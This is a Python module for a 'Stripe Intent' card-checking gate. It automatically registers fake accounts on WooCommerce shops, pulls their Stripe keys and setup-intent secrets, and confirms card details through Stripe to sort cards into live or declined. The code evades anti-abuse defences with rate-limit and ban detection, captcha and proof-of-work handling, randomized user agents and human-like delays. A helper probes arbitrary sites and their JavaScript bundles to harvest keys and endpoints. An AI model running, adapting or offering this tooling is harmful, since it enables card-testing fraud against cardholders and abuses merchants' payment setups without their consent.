import re
import json
import logging
import time
import random
import threading
from urllib.parse import urlparse
from config import get_proxy_dict, get_random_ua, get_gate_setting, fake, WC_ACCOUNT_PATHS, get_next_site, STRIPE_WC_SITE_POOL
from stripe_common import (
    make_session, get_intent_rate_limiter, is_ban_signal, is_refresh_error,
    handle_pow_and_captcha, extract_stripe_key, tokenize_card, parse_token_error,
    classify_response, classify_setup_response, error_result, format_result,
    gets, generate_fingerprint, rnd_email,
    STRIPE_VERSIONS, CCN_KEYWORDS, LIVE_KEYWORDS, DECLINE_MAP,
    reading_delay, page_interaction_delay, pre_submit_delay, retry_delay,
)

logger = logging.getLogger(__name__)

_rl = get_intent_rate_limiter()

# ── path/key cache: skip probe loops on repeat checks of the same site ──────
_intent_path_cache: dict = {}
_intent_cache_lock = threading.Lock()
_PATH_CACHE_TTL = 3600


def _intent_cache_get(site_url):
    with _intent_cache_lock:
        e = _intent_path_cache.get(site_url)
        if e and time.time() - e[2] < _PATH_CACHE_TTL:
            return e[0], e[1]  # acct_path, pub_key
        return None


def _intent_cache_set(site_url, acct_path, pub_key):
    with _intent_cache_lock:
        _intent_path_cache[site_url] = (acct_path, pub_key, time.time())


def _intent_cache_del(site_url):
    with _intent_cache_lock:
        _intent_path_cache.pop(site_url, None)


def invalidate_intent_cache(site_url=None):
    with _intent_cache_lock:
        if site_url:
            _intent_path_cache.pop(site_url, None)
        else:
            _intent_path_cache.clear()


def check_stripe_intent(cc, mm, yy, cvv, site_url=None, pub_key=None):
    site_url = (site_url or get_gate_setting("stripe_intent", "site_url", "") or get_next_site("stripe") or "https://on8mil.com").rstrip('/')
    pub_key = pub_key or get_gate_setting("stripe_intent", "stripe_pub_key", "")

    if len(yy) == 4:
        yy = yy[2:]
    if len(mm) == 1:
        mm = f"0{mm}"

    max_retries = 3
    last_error = "Unknown error"

    for attempt in range(max_retries):
        s = make_session(use_proxy=False)
        try:
            result = _do_intent_check(s, cc, mm, yy, cvv, site_url, pub_key)

            detail_text = result.get("detail", "")
            if is_ban_signal(detail_text):
                _rl.record_rate_limit()
                result["_retry"] = True

            if result.get("_retry"):
                last_error = result.get("detail", "Session error")
                logger.info(f"Stripe Intent retry {attempt+1}/{max_retries}: {last_error[:60]}")
                s.close()
                if attempt < max_retries - 1:
                    retry_delay(attempt)
                continue

            _rl.record_success()
            return result

        except Exception as e:
            err_text = str(e).lower()
            if any(sig in err_text for sig in ["429", "too many", "rate limit"]):
                _rl.record_rate_limit()
            elif any(sig in err_text for sig in ["403", "forbidden", "blocked"]):
                _rl.record_ban()

            logger.error(f"Stripe Intent error (attempt {attempt+1}): {str(e)[:80]}")
            last_error = str(e)[:80]
            if attempt < max_retries - 1:
                retry_delay(attempt)
        finally:
            try:
                s.close()
            except Exception:
                pass

    return error_result(cc, mm, yy, cvv, f"Failed after {max_retries} retries: {last_error}", "Stripe Intent")


def _do_intent_check(s, cc, mm, yy, cvv, site_url, pub_key):
    proxy_used = s.__dict__.get('_proxy_used')
    gate_name = "Stripe Intent"

    configured_path = get_gate_setting("stripe_intent", "account_path", "")
    if configured_path:
        account_paths = [configured_path] + [p for p in WC_ACCOUNT_PATHS if p != configured_path]
    else:
        account_paths = list(WC_ACCOUNT_PATHS)

    # Use cached paths to skip multi-path probe on repeat checks of the same site
    _ic = _intent_cache_get(site_url)
    if _ic:
        _ic_acct, _ic_pk = _ic
        if _ic_acct and _ic_acct not in account_paths:
            account_paths = [_ic_acct] + account_paths
        if not pub_key and _ic_pk:
            pub_key = _ic_pk
    else:
        _ic_acct, _ic_pk = None, None

    _rl.wait_if_needed()
    resp = None
    acct_path = '/my-account/'
    for try_path in account_paths:
        try:
            resp = s.get(f'{site_url}{try_path}', verify=False, timeout=20, allow_redirects=True)
            if resp.status_code == 200 and 'woocommerce-register-nonce' in resp.text:
                acct_path = try_path
                break
            elif resp.status_code == 200:
                acct_path = try_path
        except Exception:
            continue

    if not resp or resp.status_code != 200:
        status_code = resp.status_code if resp else 0
        if status_code == 429:
            _rl.record_rate_limit()
            return {**error_result(cc, mm, yy, cvv, "Rate Limited by site", gate_name), "_retry": True}
        elif status_code == 403:
            _rl.record_ban(180)
            _intent_cache_del(site_url)
            return {**error_result(cc, mm, yy, cvv, "Blocked by site (403)", gate_name), "_retry": True}
        return {**error_result(cc, mm, yy, cvv, "Cannot reach site account page", gate_name), "_retry": True}

    page_html = resp.text

    page_html, pow_err = handle_pow_and_captcha(s, page_html, f'{site_url}{acct_path}')
    if pow_err:
        return {**error_result(cc, mm, yy, cvv, pow_err, gate_name), "_retry": True}

    reading_delay(len(page_html))

    nonce = gets(page_html, 'name="woocommerce-register-nonce" value="', '"')
    if not nonce:
        nonce = gets(page_html, "woocommerce-register-nonce\" value=\"", "\"")
    if not nonce:
        nonce_match = re.search(r'woocommerce-register-nonce["\s]+value=["\']([^"\']+)', page_html)
        if nonce_match:
            nonce = nonce_match.group(1)

    if not nonce:
        return {**error_result(cc, mm, yy, cvv, "Register nonce not found", gate_name), "_retry": True}

    acc_email = rnd_email()
    acc_pass = acc_email

    page_interaction_delay(len(page_html))

    final_path = resp.url.replace(site_url, '') if resp.url.startswith(site_url) else acct_path
    if not final_path or final_path == '/':
        final_path = acct_path

    reg_data = {
        'email': acc_email,
        'password': acc_pass,
        'woocommerce-register-nonce': nonce,
        '_wp_http_referer': final_path,
        'register': 'Register',
    }
    reg_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': site_url,
        'Referer': f'{site_url}{final_path}',
    }

    try:
        _rl.wait_if_needed()
        reg_resp = s.post(resp.url, headers=reg_headers, data=reg_data, verify=False, timeout=20, allow_redirects=True)
    except Exception as e:
        return {**error_result(cc, mm, yy, cvv, f"Registration failed: {str(e)[:50]}", gate_name), "_retry": True}

    logger.info("Stripe Intent: registered account")

    page_pk = extract_stripe_key(reg_resp.text if reg_resp else '')
    final_key = pub_key or page_pk
    if not final_key:
        pm_paths = [
            f'{acct_path}add-payment-method/',
            '/my-account-2/add-payment-method/',
            '/my-account/add-payment-method/',
            '/account/add-payment-method/',
            '/checkout/',
        ]
        for pg in pm_paths:
            try:
                pr = s.get(f"{site_url}{pg}", verify=False, timeout=10, allow_redirects=True)
                if pr.status_code == 200:
                    found = extract_stripe_key(pr.text)
                    if found:
                        final_key = found
                        break
            except Exception:
                continue

    if not final_key:
        return error_result(cc, mm, yy, cvv, "No Stripe key found", gate_name)

    seti = None
    secret = None

    setup_endpoints = [
        f"{site_url}/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
        f"{site_url}/?wc-ajax=wc_stripe_create_setup_intent",
    ]
    for ep in setup_endpoints:
        try:
            _rl.wait_if_needed()
            setup_resp = s.post(ep, data={"payment_method": "stripe_cc"}, verify=False, timeout=20)
        except Exception as e:
            continue

        if setup_resp.status_code == 429:
            _rl.record_rate_limit()
            return {**error_result(cc, mm, yy, cvv, "Setup intent rate limited", gate_name), "_retry": True}

        setup_text = setup_resp.text

        if is_ban_signal(setup_text):
            _rl.record_rate_limit()
            return {**error_result(cc, mm, yy, cvv, "Setup intent blocked", gate_name), "_retry": True}

        try:
            sj = json.loads(setup_text)
            seti = sj.get('client_secret', '')
        except (json.JSONDecodeError, Exception):
            cs_match = re.search(r'"client_secret"\s*:\s*"(seti_[^"]+)"', setup_text)
            if cs_match:
                seti = cs_match.group(1)

        if not seti:
            cs_match = re.search(r'(seti_[A-Za-z0-9]+_secret_[A-Za-z0-9]+)', setup_text)
            if cs_match:
                seti = cs_match.group(1)

        if seti:
            break

    if seti and '_secret_' in seti:
        secret = seti.split('_secret_')[0]
    elif seti:
        secret = seti

    if not seti or not secret:
        return {**error_result(cc, mm, yy, cvv, "Setup intent secret not found", gate_name), "_retry": True}

    logger.info("Stripe Intent: setup intent obtained")
    if not _ic_acct and final_key:  # first successful discovery — cache for future checks
        _intent_cache_set(site_url, acct_path, final_key)

    page_interaction_delay(100)

    country_code = "US"
    parsed_site = urlparse(site_url)
    tld = parsed_site.netloc.split('.')[-1].lower()
    tld_map = {"uk": "GB", "co.uk": "GB", "ca": "CA", "au": "AU", "de": "DE", "fr": "FR", "nz": "NZ"}
    for suffix, code in tld_map.items():
        if parsed_site.netloc.endswith(f".{suffix}"):
            country_code = code
            break

    pm_id, token_err, card_brand = tokenize_card(cc, mm, yy, cvv, final_key, site_url, _rl, country_code)

    if not pm_id:
        status, detail = parse_token_error(token_err)
        logger.info(f"Stripe Intent tokenization: {status} - {detail[:80]}")
        return format_result(status, cc, mm, yy, cvv, detail, gate_name, card_brand, proxy_used)

    logger.info(f"Stripe Intent PM created: {pm_id[:20]}..., brand={card_brand}")

    confirm_headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': s.__dict__.get('_ua', get_random_ua()),
    }

    confirm_data = {
        "payment_method": pm_id,
        "use_stripe_sdk": "true",
        "key": final_key,
        "client_secret": seti,
    }

    pre_submit_delay()

    try:
        _rl.wait_if_needed()
        confirm = s.post(
            f"https://api.stripe.com/v1/setup_intents/{secret}/confirm",
            data=confirm_data, headers=confirm_headers,
            timeout=20, verify=False
        )
    except Exception as e:
        return {**error_result(cc, mm, yy, cvv, f"Confirm failed: {str(e)[:50]}", gate_name), "_retry": True}

    if confirm.status_code == 429:
        _rl.record_rate_limit()
        return {**error_result(cc, mm, yy, cvv, "Stripe API rate limited", gate_name), "_retry": True}
    elif confirm.status_code == 403:
        _rl.record_ban()
        return {**error_result(cc, mm, yy, cvv, "Stripe API blocked", gate_name), "_retry": True}

    try:
        response_data = confirm.json()
    except Exception:
        return {**error_result(cc, mm, yy, cvv, f"Invalid response: {confirm.text[:80]}", gate_name), "_retry": True}

    if not card_brand or card_brand == "N/A":
        try:
            pm = response_data.get("payment_method", {})
            if isinstance(pm, dict):
                card_brand = (pm.get("card", {}).get("brand") or card_brand).upper()
        except Exception:
            pass

    status, detail = classify_response(response_data)
    logger.info(f"Stripe Intent result: {status} - {detail[:80]}")

    return format_result(status, cc, mm, yy, cvv, detail, gate_name, card_brand, proxy_used)


def setup_stripe_intent_from_url(full_url):
    from config import set_gate_setting as _set_gs
    import requests as req

    results = {
        "success": False,
        "errors": [],
        "auto_detected": [],
    }

    full_url = full_url.strip()
    if not full_url.startswith("http"):
        full_url = f"https://{full_url}"

    parsed = urlparse(full_url)
    site_url = f"{parsed.scheme}://{parsed.netloc}"

    new_settings = {}
    try:
        s = req.Session()
        s.headers.update({'User-Agent': get_random_ua()})

        r = s.get(site_url, verify=False, timeout=15, allow_redirects=True)
        if r.status_code != 200:
            results["errors"].append(f"Site returned HTTP {r.status_code}")
            return results

        results["auto_detected"].append(f"Site URL: {site_url}")
        new_settings["site_url"] = site_url
        all_html = r.text

        probe_pages = ["/checkout/", "/my-account/", "/my-account/add-payment-method/", "/my-account-2/", "/my-account-2/add-payment-method/", "/shop/"]
        for pg in probe_pages:
            try:
                pr = s.get(f"{site_url}{pg}", verify=False, timeout=10, allow_redirects=True)
                if pr.status_code == 200:
                    all_html += "\n" + pr.text
                    results["auto_detected"].append(f"Page probed: {pg}")
            except Exception:
                continue

        pk_match = re.search(r'(pk_(?:live|test)_[A-Za-z0-9]{20,})', all_html)
        if pk_match:
            found_pk = pk_match.group(1)
            new_settings["stripe_pub_key"] = found_pk
            results["auto_detected"].append(f"Stripe key: {found_pk[:25]}...")
        else:
            results["errors"].append("No Stripe key found - set via /setconfig [id] key [pk_live_...]")

        intent_found = False
        try:
            intent_r = s.post(
                f"{site_url}/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
                data={"payment_method": "stripe_cc"},
                verify=False, timeout=10
            )
            if 'client_secret' in intent_r.text:
                intent_found = True
                results["auto_detected"].append("Setup intent endpoint: verified working")
            elif intent_r.status_code in (200, 400, 403):
                results["auto_detected"].append(f"Setup intent endpoint: exists (HTTP {intent_r.status_code})")
        except Exception:
            pass

        if not intent_found:
            if 'wc_stripe_frontend_request' in all_html.lower() or 'setup-intent' in all_html.lower():
                results["auto_detected"].append("Setup intent references found in page HTML")
            else:
                results["errors"].append("Setup intent endpoint not confirmed")

        if 'woocommerce' in all_html.lower() or 'wc-ajax' in all_html.lower():
            results["auto_detected"].append("WooCommerce: detected")

        for pg_path in ["/my-account-2/", "/my-account/", "/account/"]:
            full_pg = f"{site_url}{pg_path}"
            try:
                test_r = s.get(full_pg, verify=False, timeout=10, allow_redirects=True)
                if test_r.status_code == 200 and ('woocommerce' in test_r.text.lower() or 'stripe' in test_r.text.lower()):
                    new_settings["account_path"] = pg_path
                    results["auto_detected"].append(f"Account path: {pg_path}")
                    _set_gs("stripe_intent", "account_path", pg_path)
                    break
            except Exception:
                continue

        # Deep JS scan: recovers keys and setup-intent signals from JS bundles
        try:
            from jsrecon import jsrecon_scan as _jsr
            _jf = _jsr(site_url)
            if _jf:
                if not new_settings.get("stripe_pub_key") and _jf["stripe_keys"]:
                    _pk = _jf["stripe_keys"][0]
                    new_settings["stripe_pub_key"] = _pk
                    results["auto_detected"].append(f"JS-Recon Stripe key: {_pk[:25]}...")
                if not new_settings.get("account_path") and _jf["account_paths"]:
                    _ap = _jf["account_paths"][0]
                    new_settings["account_path"] = _ap
                    _set_gs("stripe_intent", "account_path", _ap)
                    results["auto_detected"].append(f"JS-Recon account path: {_ap}")
                _sigs = set(_jf.get("wc_signals", []))
                if "wc_stripe_frontend_request" in _sigs or "setup-intent" in _sigs or "setup_intent" in _sigs:
                    results["auto_detected"].append("JS-Recon setup intent endpoint: confirmed")
                if _sigs:
                    results["auto_detected"].append(f"JS-Recon WC: {', '.join(list(_sigs)[:4])}")
        except Exception:
            pass

        has_key = "stripe_pub_key" in new_settings
        if has_key:
            results["success"] = True
            for k, v in new_settings.items():
                _set_gs("stripe_intent", k, v)
        else:
            results["errors"].append("Setup incomplete - need Stripe pub key")

    except Exception as e:
        results["errors"].append(f"Setup error: {str(e)[:80]}")

    return results
